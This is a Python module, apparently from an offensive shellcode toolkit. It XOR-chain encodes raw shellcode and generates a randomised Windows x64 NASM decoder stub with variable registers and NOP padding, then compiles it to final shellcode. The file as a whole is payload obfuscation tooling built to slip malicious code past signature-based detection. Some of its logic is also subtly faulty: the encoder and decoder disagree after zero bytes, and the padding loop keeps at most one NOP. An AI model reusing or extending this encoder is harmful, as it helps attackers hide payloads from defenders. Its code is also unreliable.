########################################################
### ByteBert2 Module
### Status: 086 release
### 
########################################################

import random
from utils.asm import variable_instruction_set
from utils.style import *
from utils.helper import CheckFile, GetFileInfo
from utils.binary import get_coff_section
from os import path as osp
from os import name as os_name
from os import urandom as urandom
from subprocess import run
#import threading
#import time
#from tqdm import tqdm
#from yaspin import yaspin
from utils.const import *

CATEGORY    = 'encoder'
DESCRIPTION = 'XORChain - Encrypt each byte with the previous one'

arglist = {
    'input':                    { 'value': None, 'desc': 'Input file to use with xorchain' },
    'output':                   { 'value': None, 'desc': 'Outputfile for xorchain' },
    'variable_padding':         { 'value': False, 'desc': 'Inserts random NOPs to differ the padding' },
    'compile':                  { 'value': False, 'desc': 'Compile with nasm' },
    'verbose':                  { 'value': False, 'desc': 'Verbose mode' }
}

def register_arguments(parser):
            parser.add_argument('-i', '--input', help=arglist['input']['desc'])
            parser.add_argument('-o', '--output', help=arglist['output']['desc'])
            parser.add_argument('-v', '--variable-padding', type=int, help=arglist['variable_padding']['desc'])
            add = parser.add_argument_group('Additional')
            add.add_argument('--compile', action='store_true', help=arglist['compile']['desc'])
            add.add_argument('--verbose', action='store_true', help=arglist['verbose']['desc'])

class module:
    Author = 'psycore8'
    Version = '0.1.1'
    DisplayName = 'XOR-CHAiN'
    Shellcode = ''
    Shellcode_Bin = b''
    Shellcode_Length = 0
    Modified_Shellcode = ''
    key = 0
    stub_size = 0
    data_size = 0
    hash = ''
    relay = False
    relay_input = False
    relay_output = False
    shell_path = '::encoder::XORChain'

    def __init__(self, input, output, variable_padding=0, compile=bool, verbose=bool):
        self.input = input
        self.output = output
        if variable_padding == None:
            variable_padding = 0
        self.variable_padding = variable_padding
        self.compile = compile
        self.verbose = verbose
        self.compiler_cmd = nasm

    class messages:
        test = 'Test Message'

    def msg(self, message_type, MsgVar=any, ErrorExit=False):
        messages = {
            'pre.head'      : f'{FormatModuleHeader(self.DisplayName, self.Version)}\n',
            'post.done'     : f'{s_ok} DONE!',
            'error.input'   : f'{s_fail} File {self.input} not found or cannot be opened.',
            'error.output'  : f'{s_fail} File {MsgVar} not found or cannot be opened.',
            'proc.out'      : f'{s_ok} File created in {MsgVar}\n{s_note} Hash: {self.hash}',
            'proc.input_ok' : f'{s_ok} File {self.input} loaded\n{s_note} Size of shellcode {self.data_size} bytes\n{s_note} Hash: {self.hash}',
            'proc.compile'  : f'{s_ok} File {MsgVar} created\n{s_note} Size of shellcode {self.data_size} bytes\n{s_note} Hash: {self.hash}',
            'error.xor_ok'  : f"{s_fail} XOR encoded Shellcode error, aborting script execution",
            'error.nasm1'   : f'{s_fail} nasm.exe not found! Download and place it into the shencode directory: {f_link}https://nasm.us/{f_end}',
            'error.key'     : f'{s_fail} \\x00 detected! Proceeding with random key',
            'error.nasm2'   : f'{s_info} You can compile manually: nasm.exe -f win64 {MsgVar}',
            'mok'            : f'{s_ok} {MsgVar}',
            'mnote'          : f'{s_note} {MsgVar}',
            'merror'         : f'{s_fail} {MsgVar}'
        }
        print(messages.get(message_type, f'{message_type} - this message type is unknown'))
        if ErrorExit:
            exit()

    def CheckNasm(self)->bool:
        if osp.exists(self.compiler_cmd):
            return True
        else:
            return False
        
    def find_valid_xor_key(self):
        self.msg('mnote', 'Bruteforcing XOR key')
        key = self.key
        brute_force_data = self.encrypt(self.Shellcode_Bin)
        if all((b ^ key) != 0 for b in brute_force_data): 
            self.msg('mok', f'Valid XOR key found: {hex(key)}')
            return key
        if self.verbose:
            self.msg('merror', f'Found 00 bytes for XOR key {hex(key)}')
        return 0 
    
    def encrypt(self, data: bytes) -> bytes:
        transformed = bytearray()
        prev_byte = 0
        for i, byte in enumerate(self.Shellcode_Bin):
            if prev_byte == 0:
                enc_byte = byte ^ self.key
            else:
                enc_byte = byte ^ prev_byte
            transformed.append(enc_byte)
            prev_byte = byte
        return bytes(transformed)

    def LoadHeader(self):
        self.Modified_Shellcode = self.generate_win64_stub()
        self.stub_size = len(self.Modified_Shellcode)
        self.msg('mnote', f'ASM script generated with a size of {self.stub_size} bytes')

    def LoadShellcode(self):
        if self.relay_input:
            shellcode_bytes = self.input
        else:
            try:
                with open(self.input, 'rb') as file:
                    shellcode_bytes = file.read()
            except FileNotFoundError:
                self.msg('error.input', True)
        
        self.Shellcode_Bin = shellcode_bytes
        while True:
            self.key = random.randint(1, 255)
            if self.find_valid_xor_key() != 0:
                break
        #self.msg('mnote', f'Random key: {self.key} ({hex(self.key)})')

        self.Shellcode_Bin = self.encrypt(shellcode_bytes)
            
        size = len(self.Shellcode_Bin)
        self.Shellcode_Length = str(size)
        self.end_offset = str( 404 )
        self.msg('mnote', f'Payload size: {self.Shellcode_Length}')

    def ConvertShellCodeToStr(self):
        self.Shellcode = [f"0x{byte:02X}" for byte in self.Shellcode_Bin]
        self.Shellcode = '      Shellcode: db '+','.join(self.Shellcode)

    def AppendShellcode(self):
        self.Modified_Shellcode += self.Shellcode
        self.msg('mok', 'Encoded payload appended!')

    def WriteToFile(self, data, filename):
      if isinstance(data, bytes):
        with open(filename, 'wb') as file:
            file.write(data)
      elif isinstance(data, str):
            with open(filename, 'w') as file:
                file.write(data)

    def CompileObjectFile(self, nasm_file, obj_file):
        run([self.compiler_cmd, '-f', 'win64', nasm_file, '-o', obj_file])
        
    def process(self):
        self.msg('pre.head')

        fn_Root, _ = osp.splitext(self.output)
        fn_nasm = f'{fn_Root}.nasm'
        fn_obj = f'{fn_Root}.obj'

        if not self.relay_input and CheckFile(self.input):
            self.LoadShellcode()
            self.data_size, self.hash = GetFileInfo(self.input)
            self.msg('proc.input_ok')
        elif self.relay_input:
            self.LoadShellcode()
        else:
            self.msg('error.input', True)
        self.LoadHeader()
        self.ConvertShellCodeToStr()
        self.AppendShellcode()
        self.WriteToFile(self.Modified_Shellcode, fn_nasm)
        if CheckFile(fn_nasm):
            self.data_size, self.hash = GetFileInfo(fn_nasm)
            self.msg('proc.out', f'{fn_nasm}')
        else:
            self.msg('error.output', f'{fn_nasm}', True)
        if self.CheckNasm() and self.compile:
            self.msg('mnote', 'Try to compile object file')
            self.CompileObjectFile(fn_nasm, fn_obj)
            if CheckFile(fn_obj):
                self.data_size, self.hash = GetFileInfo(fn_obj)
                self.msg('proc.compile', f'{fn_obj}')
                self.msg('mnote', 'Extract .text section from object file')
                final_shellcode = get_coff_section(fn_obj, '.text')
                self.msg('mnote', f'Final shellcode size: {len(final_shellcode)} bytes')
                if self.relay_output:
                    self.msg('post.done')
                    return final_shellcode
                else:
                    self.WriteToFile(final_shellcode, self.output)
                    self.msg('post.done')
        else:
            self.msg('error.nasm1')
            self.msg('error.nasm2', f'{fn_nasm} -o {fn_obj}', True)

    def generate_win64_stub(self):
        vi = variable_instruction_set()
        rax, rbx, rdx = random.sample(vi.multi_bit_registers, 3)
        inst_asm_reg_zero = vi.register_set_zero
        asm_jmp_cond = vi.jump_conditional_positive
        asm_inc_reg = vi.increase_register(rbx[0])
        asm_dec_reg = vi.decrease_register(rax[0])
        
        rc = random.choice
        asm_reg_zero    = random.choice(inst_asm_reg_zero)
        asm_jmp_cond    = random.choice(asm_jmp_cond)

        if self.verbose:
            #self.msg('v.registers', False, f'{rax[0]}, {rbx[0]}, {rdx[0]}')
            #self.msg('v.inst', False, f'Instruction set: {asm_jmp_cond} / {asm_reg_zero}')
            #self.msg('v.inst', False, f'Increase, decrease: {asm_inc_reg} {asm_dec_reg}')
            self.msg('mnote', f'Selected registers: {rax[0]}, {rbx[0]}, {rdx[0]}')
            #self.msg('mnote', f'Instruction set: {asm_jmp_cond} / {asm_reg_zero}')

        size = int(self.Shellcode_Length)
        
        if size <= 255:
           sc_size = f'mov {rax[3]}, {size}'
        elif size <= 65535:
           sc_size = f'mov {rax[2]}, {size}'
        else:
           sc_size = f'mov {rax[1]}, {size}'

        if self.verbose:
            self.msg('mnote', f'Size instruction: {sc_size}')
        
        stub64 = f"""
            section .data

                section .text
                    global _start

                    _start:
                        {rc(inst_asm_reg_zero)} {rax[0]}, {rax[0]} ; stores shellcode size
                        {rc(inst_asm_reg_zero)} {rbx[0]}, {rbx[0]} ; stores pointer to shellcode
                        {rc(inst_asm_reg_zero)} {rdx[0]}, {rdx[0]} ; stores the key (random byte or previous decrypted byte)
                        {sc_size}  ; shellcode size
                        mov {rdx[3]}, {self.key}  ; initial key
                        jmp short call_decoder

                    decoder:
                        pop {rbx[0]}
                    
                    decode_loop:
                        test {rax[0]}, {rax[0]}
                        {asm_jmp_cond} Shellcode
                        xor byte [{rbx[0]}], {rdx[3]}
                        mov {rdx[3]}, [{rbx[0]}]
                        {asm_inc_reg}
                        {asm_dec_reg}
                        jmp decode_loop

                    call_decoder:
                        call decoder
        """
        
        if self.variable_padding != 0:
            i = 0
            while i in range(0, self.variable_padding):
                nop = vi.nop_instruction()
                paddy = stub64.split('\n')
                spacer = ' ' * 24
                noppy = f'{spacer}{nop}'
                random_noppy_index = random.randint(6, len(paddy)-2)
                paddy.insert(random_noppy_index, noppy)
                stub64_paddy = '\n'.join(paddy)
                if self.verbose:
                    #self.msg('v.padding', False, f'{random_noppy_index}')
                    self.msg('mnote', f'Added NOP at line {random_noppy_index}')
                i += 1
            return stub64_paddy
        else:
            return stub64
    
